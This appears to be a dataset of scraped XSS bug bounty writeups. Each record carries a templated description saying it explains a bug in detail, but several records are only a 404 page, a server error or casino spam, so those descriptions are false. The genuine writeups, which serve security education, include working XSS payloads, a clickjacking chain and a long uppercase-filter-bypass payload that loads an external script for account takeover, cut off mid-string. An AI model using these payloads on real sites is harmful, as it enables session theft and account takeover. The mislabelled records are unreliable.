{"source_url": "https://noobe.io/articles/2019-10/xss-to-account-takeover", "title": "Page Not Found - XVIP", "friendly_explanation": "This is a bug bounty writeup from https://noobe.io/articles/2019-10/xss-to-account-takeover. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPage Not Found - XVIP Chuyển đến nội dung Game Hot Live Casino Hướng Dẫn Link Xvip Đăng Ký Đăng Nhập Nạp Tiền Rút Tiền Khuyến Mãi Hỏi Đáp Thường Gặp Liên Hệ Về Chúng Tôi đăng ký 404 Ối! Không thể tìm thấy trang đó. Có vẻ như không có gì được tìm thấy ở vị trí này. Có thể thử một trong các liên kết dưới đây hoặc tìm kiếm? XVIP là cổng game đang gây sốt hiện nay với nhiều phần thưởng cho thành viên mới. Tải ngay trên iOS/Android tại XVIP.casino. LIÊN HỆ HỖ TRỢ Phone: +84-943-347-586 Email: [email protected] LIÊN KẾT NHANH Link XVIP Giới Thiệu Chăm Sóc Khách Hàng Khuyến Mãi Tại XVIP Nạp Tiền / Rút Tiền Hỏi Đáp Thường Gặp Chính Sách Bảo Mật Miễn Trừ Trách Nhiệm Copyright 2025 © Bản quyền thuộc XVIP"}
{"source_url": "https://medium.com/@04sabsas/bugbounty-writeup-take-attention-and-get-stored-xss-495dd6eab07e", "title": "BugBounty WriteUp — take attention and get Stored XSS | by Oleksandr Opanasiuk | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@04sabsas/bugbounty-writeup-take-attention-and-get-stored-xss-495dd6eab07e. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBugBounty WriteUp — take attention and get Stored XSS | by Oleksandr Opanasiuk | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in BugBounty WriteUp — take attention and get Stored XSS Oleksandr Opanasiuk 3 min read · Aug 14, 2019 -- Listen Share Hi all, The sponsor of this writeup is the attention for minor features that allowed me to get a good xxxx reward. Press enter or click to view image in full size Press enter or click to view image in full size So, let’s imagine that we have a Web Application “ WA ”, that allows you to create users , companies and invite users to the company . The functional of inviting worked like this — the user received a letter in the mail, where it was said: “ You were invited to join company Hackerman. Accept invite [link]” As the site allowed us to name of company contain “<> etc — I put the name of company as: And you know what… I got such invite on email: So I got such things earlier, and in principle… we can already report at this point, since this allows us to generate HTML messages by mail and send on behalf of the web application. (I used to find such a vulnerability on the site of one mobile giant, there we could change some parameters in the post request for registration, and then the link to confirm the account came with a broken HTML). But… I sat on the site a little more and found that the site has internal notifications that you were invited — and when you go to the notification page — a window appears that says about the invitation. And you know what? They also did not filter html on this page :)))))) Sooo, lets register comapany a”><svg\\onload=alert(1)> and — for all the users that we invite — they receive notifications about the invitation, thereby activating the Stored XSS. Press enter or click to view image in full size And after reporting and confirmation of vulnerability — a team member wrote to me that the problem with the email is a duplicate, but the previous hacker didn’t say anything about the Stored XSS! It’s a pity, because it turns out he missed such functionality and such critical vulnerability :( While I was writing this WriteUp, I suddenly started to feel sorry for myself too — I remembered the #bugbountytips from intigrity — and there was a picture like “Found SSRF — exploit RCE, found Self-XSS — exploit Stored XSS with the help of CSRF, Found Stored XSS — exploit Account Takeover”. And only now I realized that I could work a little more and get much more, even P1. I hope you do not repeat my mistakes, always take the maximum impact from any vulnerability! Find out more writeups (LOL 1 more xd)— https://twitter.com/Lekssik2 — will try to make them in more quantity and describe more interesting bugs. Have a good day and wish you success in all your endeavors! :) Oleksandr Opanasiuk The latest Tweets from Oleksandr Opanasiuk (@Lekssik2). Great manager and not bad pentester https://t.co/qJyb7tVAtx… twitter.com Security Bug Bounty Pentesting Hacking Writeup -- -- Written by Oleksandr Opanasiuk 100 followers · 51 following Great pentester and not bad manager https://twitter.com/Lekssik2 No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://gauravnarwani.com/how-i-xssed-admin-account/", "title": "Not Acceptable!", "friendly_explanation": "This is a bug bounty writeup from https://gauravnarwani.com/how-i-xssed-admin-account/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nNot Acceptable! Not Acceptable! An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security."}
{"source_url": "https://websecblog.com/vulns/clickjacking-xss-on-google-org/", "title": "Clickjacking DOM XSS on Google.org - Web Security Blog", "friendly_explanation": "This is a bug bounty writeup from https://websecblog.com/vulns/clickjacking-xss-on-google-org/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nClickjacking DOM XSS on Google.org - Web Security Blog Skip to content (Press Enter) Web Security Blog Thomas Orlita’s blog About Me About Me Clickjacking DOM XSS on Google.org by Thomas Orlita Vulnerabilities August 12, 2019 June 10, 2022 One of the lesser-known Google projects is Google Crisis Map . It was created to help people find and use critical emergency information. [source] Although it is still working, it doesn’t seem to be used much anymore. Since it’s an older project (created in 2012) and not updated often, it’s a great target to look for vulnerabilities. It’s hosted on the google.org domain, which doesn’t have as big a severity as google.com (for client-side vulnerabilities), but it’s still a domain owned by Google. Logging in If you go to the project’s home page ( google.org/crisismap ), you’ll get redirected to the default map “Weather and Events”. This isn’t very interesting for us since the only thing we can do is view the map. There is a way to manage and create new maps. It can be accessed if we add .maps at the end of the URL: google.org/crisismap/.maps Once you open this page, you’ll need to log in with your Google account to continue. Now you should see a dashboard with a list of maps. There are three default maps for every account. For some reason, if you publish one of these maps on your own domain, everyone will see that in the dashboard under the “Published Map” field. Creating a map If you click on the red “Create Map” button, you’ll most likely see a message that the gmail.com domain can’t be used for creating new maps. This means we need to log in using an email with our custom domain. We can do this either by logging in with a GSuite account or an email that uses a domain other than gmail.com. After that, we can create a new map. After clicking the “Continue” button, we’ll get redirected to a page where we can edit the newly created map. Finding the XSS First, we’ll add a new layer to the map. A dialog for creating a new layer will pop up. We’ll enter anything as the “Title”. Now if we enter javascript:alert(document.domain) into the “Source URL” field, it’ll show an error: Invalid URL – please include a protocol (e.g. http:// or https://) This means it checks if the URL is valid before it allows you to save the new layer. The deobfuscated JavaScript code that validates the URL looks like this: if (url && !url.toLowerCase().match(\"^\\\\s*(http://|https://|docs://|$)\")) { showError(\"Invalid URL - please include a protocol (e.g. http:// or https://)\"); } But this is only validation on the client-side before the actual save request is sent to the backend. Modifying the request We can use a web debugging proxy like Fiddler or Burp Suite to modify the request and send the modified version instead. First, we need to change the “Source URL” to a valid URL, e.g. https://example.com . We’ll click the “OK” button and click “Save” to send the save request. Then we’ll modify the request. This is what the request looks like: POST https://google.org/crisismap/.api/maps/1234 { \"id\": \"1234\", \"title\": \"Untitled map\", \"base_map_type\": \"GOOGLE_ROADMAP\", \"layers\": [{ \"id\": \"1\", \"title\": \"Test layer\", \"visibility\": \"DEFAULT_ON\", \"type\": \"KML\", \"source\": { \"kml\": { \"url\": \"https://example.com\" } } }] } We’ll replace https://example.com with javascript:alert(document.domain) and send this modified request. Testing the XSS The request is now sent and saved, so we’ll reload the page. Open “Layers” and click on “Download KML”. After we click on the download link, the XSS is fired and the alert box pops up with the domain name! How to fix this Why did this happen? The URL validation happened only on the frontend and not in the backend. That means this could be fixed by validating the URL in the backend as well. But this is not the way Google decided to fix it. Instead of checking the URL when saving it in the backend, the URL is now validated before displaying in the DOM. So if the URL isn’t valid, it won’t be used as the link. It’ll use a meaningless value like about:invalid instead. <a href=\"about:invalid#zClosurez\">Download KML</a> The impact Okay, so we have a link that points to a javascript: URI containing the payload. The link is on a page to manage the map. And you must log in and have permission to access the page. Clearly, this is self-XSS since only we are able to get this XSS executed. Now how do we get from self-XSS to a real XSS? Increasing the severity Every map we create can be published to be viewed by the public. If you’re logged in via an email with the domain example.com , you can publish the map to the URL https://google.org/crisismap/example.com/test . Anyone can open this URL and view the map we’ve created. To get the XSS working, the user would have to open or be navigated to this page, open the “Layers” view and then click the “Download KML” link. This means it’d no longer be self-XSS, but it’s still too many steps the user would have to make for this XSS to be useful. Clickjacking If we take a look at the response HTTP headers, we can see that google.org doesn’t send the X-Frame-Options header. Response headers from google.org Response headers from google.com The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a <frame> , <iframe> , <embed> or <object> . Sites can use this to avoid clickjacking attacks, by ensuring that their content is not embedded into other sites. — MDN web docs The (intentional) lack of this HTTP header on google.org means we can embed the published map into an iframe on our own website. <iframe src=\"https://google.org/crisismap/example.com/test\"></iframe> This is how it’ll look like. In order to fire the XSS the user now doesn’t have to even leave our website. But they’d still need to click on two places in the iframe (“ Layers ” > “ Download KML “). The iframe is loaded on our website – that means we can use CSS and JavaScript to manipulate it. The first thing that came to my mind was to put black DIVs around the point where we want the user to click. Then detect a click and move the DIV to the second point. This worked well but it still requires the user to click on two different locations. But a more efficient solution would be to position the iframe absolutely with CSS so the user doesn’t have to move the cursor at all. Below is was a live demo. Unfortunately, Google Crisis Map has been discontinued so the live demo won’t work anymore. You can see how it looked like in the video . It scales the iframe 50× and moves it to the position we want the user to click. First to the “Layers” tab. After a click, it moves over the link with the payload. It was possible to execute the XSS by clicking two times somewhere in the iframe . We could even overlay the iframe with an opaque div with pointer-events disabled, so the user would have no idea they are clicking in the iframe. For the sake of the sample and the fact that this vulnerability is already fixed, the link goes to https:// and not javascript: URI. Conclusions There are several things to be taken from here. Never trust user input. Always check (on the backend) if it’s valid before saving it. Make sure to properly sanitize it depending on the context it will be in. Don’t allow other domains to embed your website in an iframe by correctly setting the X-Frame-Options header. When looking for vulnerabilities, try to find the highest possible severity of the vulnerability. For example, if you find an XSS, try making it into an account takeover by finding incorrectly configured cookies or endpoints. Don’t be afraid to look for older projects that still fit into the scope of the Bug Bounty program. Timeline 2018-12-09 Vulnerability reported 2018-12-10 Priority changed to P1 2018-12-10 Looking into it 2018-12-10 Nice catch 2018-12-11 Reward issued Written by Thomas Orlita Follow me on Twitter: @ThomasOrlita / Mastodon: @ThomasOrlita@infosec.exchange Post Navigation Previuos Article Previous Article: XSSing Google Employees — Blind XSS on googleplex.com Next Article Listing all registered email addresses on Google’s Crisis Map thanks to IDOR and incremental IDs Related Articles How to use Google’s CSP Evaluator to bypass CSP by Thomas Orlita in Vulnerabilities Liking GitHub repositories on behalf of other users — Stored XSS in WebComponents.org by Thomas Orlita in Vulnerabilities Angular XSS vulnerability on McDonalds.com by Thomas Orlita in Vulnerabilities Inserting arbitrary files into anyone’s Google Earth Studio Projects Archive by Thomas Orlita in Vulnerabilities Web Security Blog by Thomas Orlita Digital Download | Developed by Rara Theme . Powered by WordPress ."}
{"source_url": "https://payatu.com/blog/nikhil-mittal/firefox-ios-qr-code-reader-xss-(cve-2019-17003", "title": "Get Pwned By Scanning Firefox QR Code Reader - Payatu", "friendly_explanation": "This is a bug bounty writeup from https://payatu.com/blog/nikhil-mittal/firefox-ios-qr-code-reader-xss-(cve-2019-17003. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGet Pwned By Scanning Firefox QR Code Reader - Payatu Skip to content Services Product Security AI/ML Security Audit Red Team Assessment Cloud Security Assessment Critical Infrastructure Assessment DevSecOps Consulting Code Review Mobile Application Security Testing SOC Service Web Application Security Testing IoT Security Assessment GRC Products EXPLIoT Cloudfuzz Who we are About Us Payatu Bandits Resources Advisory Blog BugBazaar Case Studies Checklist CISO Corner Datasheet DVAPI Ebooks Masterclass Media Securecodewiki Telegram Community Contact Us CISO Corner Services Product Security AI/ML Security Audit Red Team Assessment Cloud Security Assessment Critical Infrastructure Assessment DevSecOps Consulting Code Review Mobile Application Security Testing SOC Service Web Application Security Testing IoT Security Assessment GRC Products EXPLIoT Cloudfuzz Who we are About Us Payatu Bandits Resources Advisory Blog BugBazaar Case Studies Checklist CISO Corner Datasheet DVAPI Ebooks Masterclass Media Securecodewiki Telegram Community Contact Us CISO Corner Services Product Security AI/ML Security Audit Red Team Assessment Cloud Security Assessment Critical Infrastructure Assessment DevSecOps Consulting Code Review Mobile Application Security Testing SOC Service Web Application Security Testing IoT Security Assessment GRC Products EXPLIoT Cloudfuzz EXPLIoT is framework for IoT security testing and exploitation. CloudFuzz is platform that lets you code for bugs by running your software with millions of test cases. Who we are About Us Payatu Bandits Resources Resources Advisory Blog Case Studies Checklist CISO Corner Datasheet Ebooks Masterclass Media Tools BugBazaar Securecodewiki DVAPI Community Telegram Community Contact Us CISO Corner Get Pwned By Scanning Firefox QR Code Reader Nikhil Mittal December 10, 2019 One of the most common ways to navigate to a website or URLs is by typing website address in the browser address bar Table of Contents Toggle XSS In Reader Mode XSS In Local Files XSS In Internal Pages CSP Bypass Other sources Other browsers Root cause Advisiory: But this might be frustrating if you have to type a complex web address that includes some kind of tokens. And hence QR code scanner comes handy. You just need to scan a QR code and you will be redirected to specified URL or the fetched information will be displayed on your screen. Almost every one of us uses random QR codes at so many places, but have you ever wondered what could go wrong if the trusted QR scanner software not implemented correctly? According to this tweet by firefox QR scanner is supported in firefox since version 10 Firefox IOS use WebKit web view to render the content and rest of the part is written in SWIFT by firefox that means the rest of the part comes under the firefox bug bounty program. Here is a quick image that shows how we can use QR for the navigation So what could go wrong? As an evil mind, the first strategy is to always look for the different javascript URI navigation patterns, and hence the first idea is to check what would happen if instead of the URL we make a QR code with javascript URI? Will the browser treat them like normal text? or it will execute as javascript code? Let’s figure it out. Now, all we need is a website that can generate QR code based on our input I found this website https://www.the-qrcode-generator.com/ pretty easy. Next, let’s navigate to free text section of the site and generate a QR code with javascript URI. javascript:fetch('/').then(res=>res.text()).then(data=>alert(data)); It could be more simple in the following way javascript:alert(document.body.innerHTML); But i like fetch API. The above code will try to fetch the source of last visited domain by the user. Let’s suppose our user is on google.com After he decided to navigate to another address by scanning the QR code. so in this case as soon as the user scans the QR code source of the current domain will be prompted to the user since firefox evaluated the javascript URI . Now people who scan random QR code on random websites can think of the different consequences. Since we have javascript code execution on the current domain, we can steal user’s data, cookies and what not! So If you are thinking this is limited to the web address you might be wrong! Let’s explore other places The first thing that came to my mind is the browser’s reader mode XSS In Reader Mode A reader mode is a feature implemented in most of the browsers that allow users to read articles in a clutter-free view i.e rendering a page in a way that will be easy to read without any distraction. During the rendering process, browsers remove all unnecessary code, like javaScript, iframes, other embedding elements etc to make sure there will be no advertisement or any interruption while being in the reading mode. I tried the same exploit while the document rendered in the reader mode and it worked as demonstrated in the below image Did you noticed the javascript code executed in reference to http://localhost:6571 and if you check window.location.href it will be http://localhost:6571/reader-mode/page?url=https://wwww.anysite.com Now basically you can you add any URL in the last which makes another vulnerability that allows firefox to put any website in the reader mode even though the reading mode is not available for the particular website. You can also look for other possible attack vectors here XSS In Local Files Next, we can try the same attack in local files as well, that too worked fine for us as demonstrated in the below image. One more thing that we can do here is we can also load the local files by making QR code with local file URI like file:///test.html XSS In Internal Pages Apart from domains, reader mode and local files we can also XSS internal pages of browser in case of firefox they run under internal:// pseudo-protocol. CSP Bypass It turns out this vulnerability also bypass the CSP Let’s suppose a website only allowing content that comes from the site’s own content as given below // test.php <?php header(\"Content-Security-Policy: default-src 'self'\"); if(isset($_GET['xss'])) { echo $_GET['xss']; } ?> even if you are on test.php our javascript code will be executed without any restrication. Other sources Next, I have tried to find other sources as well, and I found that we can search selected text using the same or other browsers. Here also if the selected text is javascript URI Firefox will execute javascript code instead of searching it on the default search engine. This particular vulnerability was not useful because the javascript code executed in reference to a blank domain which is harmless as demonstrated in the below image. But still, we can navigate the user to other malicious websites. Other browsers Apart from Mozilla, Opera mini for IOS devices was also affected, We have reported this vulnerability to opera but they have not responded back to us. Root cause Till the version 19 firefox was supporting javascript URI from the address bar, we can check from the source code firefox-ios/BrowserViewController+WebViewDelegates.swift at v19.x · mozilla-mobile/firefox-ios · GitHub After reporting this bug firefox has removed javascript URI support from the address bar, as we can see here firefox-ios/BrowserViewController+WebViewDelegates.swift at master · mozilla-mobile/firefox-ios · GitHub Advisiory: https://payatu.com/advisory/firefox-ios-qr-code-reader-xss Subscribe to our Newsletter Subscription Form Δ Subscribe Research Powered Cybersecurity Services and Training. Eliminate security threats through our innovative and extensive security assessments. Subscribe to our newsletter Subscription Form Δ Subscribe Services IoT Security Assessment Red Team Assessment Product Security AI/ML Security Audit Web Application Security Testing SOC Service Hamburger Toggle Menu Mobile Application Security Testing DevSecOps Consulting Code Review Cloud Security Assessment Critical Infrastructure Assessment Hamburger Toggle Menu Products ExPLIoT CloudFuzz Hamburger Toggle Menu Conference Nullcon Hardwear.io Hamburger Toggle Menu Resources Blog Masterclass Case Studies Ebooks Advisory Media Checklist Reports Datasheet CISO Corner Hamburger Toggle Menu About Career About Us News Contact-Us Payatu Bandits WhatsApp Community Hardware-Lab Disclosure Policy Corporate Partners Hamburger Toggle Menu Youtube Linkedin Facebook Twitter Instagram Whatsapp All rights reserved © 2025 Payatu Home News Advisory Hardware-Lab Contact-Us Career Telegram Community Home News Advisory Hardware-Lab Contact-Us Career Telegram Community Youtube Linkedin Facebook Twitter Instagram Telegram Services IoT Security Assessment Red Team Assessment Product Security AI/ML Security Audit Web Application Security Testing Mobile Application Security Testing DevSecOps Consulting Code Review Cloud Security Assessment SOC Service Critical Infrastructure Assessment Products EXPLIoT CloudFuzz Who we are About Us Payatu Bandits Resources Blog Masterclass Series Ebooks Advisory Media Checklist BugBazaar securecode.wiki Telegram Community News Advisory Hardware-Lab Career Contact-Us Pune Location Europe Location Australia Location USA Location Services IoT Security Assessment Red Team Assessment Product Security AI/ML Security Audit Web Application Security Testing Mobile Application Security Testing DevSecOps Consulting Code Review Cloud Security Assessment SOC Service Critical Infrastructure Assessment Products EXPLIoT CloudFuzz Who we are About Us Payatu Bandits Resources Blog Masterclass Series Ebooks Advisory Media Checklist BugBazaar securecode.wiki Telegram Community News Advisory Hardware-Lab Career Contact-Us Pune Location Europe Location Australia Location USA Location DOWNLOAD THE DATASHEET Fill in your details and get your copy of the datasheet in few seconds DOWNLOAD THE EBOOK Fill in your details and get your copy of the ebook in your inbox Ebook Download Δ Your Name Company Email How did you hear about Payatu? Contact Number Checkbox Field We're committed to your privacy. Payatu uses the information you provide to us to contact you about our relevant content, products, and services. You may unsubscribe from these communications at any time. Download Now DOWNLOAD A SAMPLE REPORT Fill in your details and get your copy of sample report in few seconds Download ICS Sample Report Δ How did you hear about Payatu? Download DOWNLOAD A SAMPLE REPORT Fill in your details and get your copy of sample report in few seconds Download Cloud Sample Report Δ Contact Number How did you hear about Payatu? Download DOWNLOAD A SAMPLE REPORT Fill in your details and get your copy of sample report in few seconds Download IoT Sample Report Δ Contact Number How did you hear about Payatu? Download DOWNLOAD A SAMPLE REPORT Fill in your details and get your copy of sample report in few seconds Download Code Review Sample Report Δ Contact Number How did you hear about Payatu? Download DOWNLOAD A SAMPLE REPORT Fill in your details and get your copy of sample report in few seconds Download Red Team Assessment Sample Report Δ Contact Number How did you hear about Payatu? Download DOWNLOAD A SAMPLE REPORT Fill in your details and get your copy of sample report in few seconds Download AI/ML Sample Report Δ Contact Number How did you hear about Payatu? Download DOWNLOAD A SAMPLE REPORT Fill in your details and get your copy of sample report in few seconds Download DevSecOps Sample Report Δ Contact Number How did you hear about Payatu? Download DOWNLOAD A SAMPLE REPORT Fill in your details and get your copy of sample report in few seconds Download Product Security Assessment Sample Report Δ Contact Number How did you hear about Payatu? Download DOWNLOAD A SAMPLE REPORT Fill in your details and get your copy of sample report in few seconds Download Mobile Sample Report Δ Contact Number How did you hear about Payatu? Download DOWNLOAD A SAMPLE REPORT Fill in your details and get your copy of sample report in few seconds Download Web App Sample Report Δ Contact Number How did you hear about Payatu? Download Let’s make cyberspace secure together! Requirements Connect Now Form Δ I am Interested in: Cybersecurity Services Cybersecurity Training Select Service Web Application Security Mobile application Security IoT Product Ecosystem Security Red Team Assessment Cloud Application and Infrastructure Security Code Review Threat Modeling and Architecture Review Product Security Assurance Programme Cyber Investigation and Forensic Critical Infrastructure Security Assessment Blockchain Security Audit Other Cyber Security Services Select the reason for an assessment. Regulatory Compliance Pass a vendor assessment Product release Find vulnerabilities (Proactiveness) Select a tentative start time. Right Away (ASAP) Within 2 weeks Within 4 weeks I am flexible Select Training Practical IoT Hacking Web Security Mobile Security Exploitation Machine Learning Security Cloud Security Network Infrastructure Security Red Team Assessment Practical DevSecOps Attack Monitoring for SOC Any Other Contact information Organization Designation Select Designation Director CXO Senior Leader Security Consultant CISO Any other Offical Email ID Contact Number How did you hear about Payatu? Lets Connect What our clients are saying! Trade Ledger takes privacy and security of it’s customers and system very seriously. We needed an independent audit to check our systems, and wanted to partner with a team that understands the compliance environment of banks. MARTIN MECCAN CEO - TradeLedger Australia Trusted by"}
{"source_url": "https://nirmaldahal.com.np/xss-is-love/", "title": "404: This page could not be found.", "friendly_explanation": "This is a bug bounty writeup from https://nirmaldahal.com.np/xss-is-love/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n404: This page could not be found. Nirmal Dahal 404 This page could not be found. LinkedIn X"}
{"source_url": "https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce", "title": "Bypass Uppercase filters like a PRO (XSS Advanced Methods) | by Master SEC | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBypass Uppercase filters like a PRO (XSS Advanced Methods) | by Master SEC | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Bypass Uppercase filters like a PRO (XSS Advanced Methods) Master SEC 4 min read · Oct 11, 2019 -- 3 Listen Share a code injection inside javascript code can be a headache… But nothing is impossible While we are not working on Pentesting for companies, we love to Bug Hunting on Hackerone. We founded a vulnerable section on a site, with some sort of google analytics code, vulnerable to a URL XSS. http://website.com/dir/subdir And inside the javascript code: function(\"/DIR/SUBDIR\",params); Burp suite discovered, that adding “-alert(1)-” at the end of the URL (http://website.com/dir/subdir/”-alert(1)-”, would be reflecting the XSS Press enter or click to view image in full size and browser telling us unable to find function ALERT(1), the GET parameter is getting uppercased :( So we started testing things to see what is filtered from the server: </script>, //, \\, . [dots] aren’t available for use. But we can use everything else “,’,[,],{,} Ok, now what? Let's find a payload that can work. We ended up with a few solutions all related to the jsfuck.com one. It was perfect no dots but very long. Jsfuck from Martin Kleppe Also in hackerone if you can execute an alert(1), is just a Low severity XSS, we wanted to escalate this vulnerability to High or Critical, which can be done with loading an external JS file that executes arbitrary web actions without the user interaction. This is a WordPress payload, our goal was to load an external JS with something like this for this website, changing account password or email. continuing to JsFuck payloads, a simple alert(1) got converted tohat’s dope, pretty ugly and LONG. If i wanted to alert(document.cookie) its above 13000 characters long, I figured out that after 2500–2700 characters the webserver started returning Error 400 . So we started investigating how jsfuck works. const SIMPLE = { 'false': '![]', 'true': '!0', 'undefined': '0[0]', 'NaN': '+[!0]', 'Infinity': '+(+!0+(!0+[])[!0+!0+!0]+[+!0]+[0]+[0]+[0])' // +\"1e1000\" }; const CONSTRUCTORS = { 'Array': '[]', 'Number': '(+0)', 'String': '([]+[])', 'Boolean': '(!0)', 'Function': '[][\"fill\"]', 'RegExp': 'Function(\"return/\"+0+\"/\")()' }; const MAPPING = { 'a': '(false+\"\")[1]', 'b': '([][\"entries\"]()+\"\")[2]', 'c': '([][\"fill\"]+\"\")[3]', 'd': '(undefined+\"\")[2]', 'e': '(true+\"\")[3]', 'f': '(false+\"\")[0]', 'g': '(false+[0]+String)[20]', 'h': '(+(101))[\"to\"+String[\"name\"]](21)[1]', 'i': '([false]+undefined)[10]', 'j': '([][\"entries\"]()+\"\")[3]', 'k': '(+(20))[\"to\"+String[\"name\"]](21)', 'l': '(false+\"\")[2]', 'm': '(Number+\"\")[11]', 'n': '(undefined+\"\")[1]', 'o': '(true+[][\"fill\"])[10]', 'p': '(+(211))[\"to\"+String[\"name\"]](31)[1]', I started trying to execute part of this on Chrome, to see how it works. so basically, we can scrap strings from the different type of vars, so we can get the lowercase letters from false, true, undefined, NaN, Infinity, etc. So I managed to get the whole abecedary without using lowercase letters. Á=![]; //false É=!![]; //true Í=[][[]]; //undefined Ó=+[![]]; //NaN SI=+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]]);// Infinity ST=([]+[]); // Ü=(+[]); A=(Á+\"\")[1]; D=(Í+\"\")[2]; E=(É+\"\")[3]; F=(Á+\"\")[0]; G=[![]+[+[]]+[[]+[]][+[]][[![]+{}][+[]][+!+[]+[+[]]]+[[]+{}][+[]][+!+[]]+[[][[]]+[]][+[]][+!+[]]+[![]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[!![]+[]][+[]][+!+[]]+[[][[]]+[]][+[]][+[]]+[![]+{}][+[]][+!+[]+[+[]]]+[!![]+[]][+[]][+[]]+[[]+{}][+[]][+!+[]]+[!![]+[]][+[]][+!+[]]]][+[]][!+[]+!+[]+[+[]]]; I=([Á]+Í)[10]; L=(Á+\"\")[2]; T=(É+\"\")[0]; O=(É+[][F+I+L+L])[10]; R=(É+\"\")[1]; N=(Í+\"\")[1]; M=(+(208))[T+O+\"S\"+T+R+I+N+G](31)[1]; P=(+(211))[T+O+\"S\"+T+R+I+N+G](31)[1]; S=(Á+\"\")[3]; U=(Í+\"\")[0]; V=(+(31))[T+O+\"S\"+T+R+I+N+G](32); X=(+(101))[T+O+\"S\"+T+R+I+N+G](34)[1]; Y=(Ó+[SI])[10]; Z=(+(35))[T+O+\"S\"+T+R+I+N+G](36); C=([][F+I+L+L]+\"\")[3]; H=(+(101))[T+O+\"S\"+T+R+I+N+G](21)[1]; K=(+(20))[T+O+\"S\"+T+R+I+N+G](21); W=(+(32))[T+O+\"S\"+T+R+I+N+G](33); J=([][E+N+T+R+I+E+S]()+\"\")[3]; B=([][E+N+T+R+I+E+S]()+\"\")[2]; Also i was needing slashes and DOT, i was able to get the DOT from 1.1e+101 float value. awesome we got the dot, now I was missing “/” and “g” because the uppercase filters so I decided to jsfuck do the work for me I was sacrificing 1200 chars but this payload was about 500–800 so I was in the 2400–2600 range from the http request. Now that I have all chars is the fun part. Execution Execution Execution. [][F+I+L+L][C+O+N+S+T+R+U+C+T+O+R](A+L+E+R+T(1))(); This was translated to fill.constructor(alert(1)) and we got our javascript executed with all uppercase letters! awesome!. Hopefully, our vulnerable site was using jquery but loaded at the end of the HTML code, after this injection, so it will return function not found, we had to wait 3 seconds to load all dependencies and execute $.getScript to load our external JS file. [][F+I+L+L][C+O+N+S+T+R+U+C+T+O+R](S+E+T+\"T\"+I+M+E+O+U+T+\"(\"+F+U+N+C+T+I+O+N+\"(){ $\"+DOT+G+E+T+\"S\"+C+R+I+P+T+\"('\"+SLA+SLA+\"test\"+SLA+\"test')(); }, 3000);\")(); Press enter or click to view image in full size And it worked, after 3 seconds I got the test/test request showing up!! so we URL encode it and our final payload was like %3B%C3%81=![]%3B%C3%89=!![]%3B%C3%8D=[][[]]%3B%C3%93=%2B[![]]%3BSI=%2B(%2B!%2B[]%2B(!%2B[]%2B[])[!%2B[]%2B!%2B[]%2B!%2B[]]%2B[%2B!%2B[]]%2B[%2B[]]%2B[%2B[]]%2B[%2B[]])%3BST=([]%2B[])%3B%C3%9C=(%2B[])%3BA=(%C3%81%2B%22%22)[1]%3BD%20=%20(%C3%8D%2B%22%22)[2]%3BE%20=%20(%C3%89%2B%22%22)[3]%3BF%20=%20(%C3%81%2B%22%22)[0]%3BG%20=%20[![]%2B[%2B[]]%2B[[]%2B[]][%2B[]][[![]%2B%7B%7D][%2B[]][%2B!%2B[]%2B[%2B[]]]%2B[[]%2B%7B%7D][%2B[]][%2B!%2B[]]%2B[[][[]]%2B[]][%2B[]][%2B!%2B[]]%2B[![]%2B[]][%2B[]][!%2B[]%2B!%2B[]%2B!%2B[]]%2B[!![]%2B[]][%2B[]][%2B[]]%2B[!![]%2B[]][%2B[]][%2B!%2B[]]%2B[[][[]]%2B[]][%2B[]][%2B[]]%2B[![]%2B%7B%7D][%2B[]][%2B!%2B[]%2B[%2B[]]]%2B[!![]%2B[]][%2B[]][%2B[]]%2B[[]%2B%7B%7D][%2B[]][%2B!%2B[]]%2B[!![]%2B[]][%2B[]][%2B!%2B[]]]][%2B[]][!%2B[]%2B!%2B[]%2B[%2B[]]]%3BI%20=%20([%C3%81]%2B%C3%8D)[10]%3BL%20=%20(%C3%81%2B%22%22)[2]%3BT%20=%20(%C3%89%2B%22%22)[0]%3BO%20=%20(%C3%89%2B[][F%2BI%2BL%2BL])[10]%3BR%20=%20(%C3%89%2B%22%22)[1]%3BN%20=%20(%C3%8D%2B%22%22)[1]%3BM%20=%20(%2B(208))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](31)[1]%3BP%20=%20(%2B(211))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](31)[1]%3BS%20=%20(%C3%81%2B%22%22)[3]%3BU%20=%20(%C3%8D%2B%22%22)[0]%3BV%20=%20(%2B(31))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](32)%3BX%20=%20(%2B(101))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](34)[1]%3BY%20=%20(%C3%93%2B[SI])[10]%3BZ%20=%20(%2B(35))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](36)%3BC%20=%20([][F%2BI%2BL%2BL]%2B%22%22)[3]%3BH%20=%20(%2B(101))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](21)[1]%3BK%20=%20(%2B(20))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](21)%3BW%20=%20(%2B(32))[T%2BO%2B%22S%22%2BT%2BR%2BI%2BN%2BG](33)%3BJ%20=%20([][E%2BN%2BT%2BR%2BI%2BE%2BS]()%2B%22%22)[3]%3BB%20=%20([][E%2BN%2BT%2BR%2BI%2BE%2BS]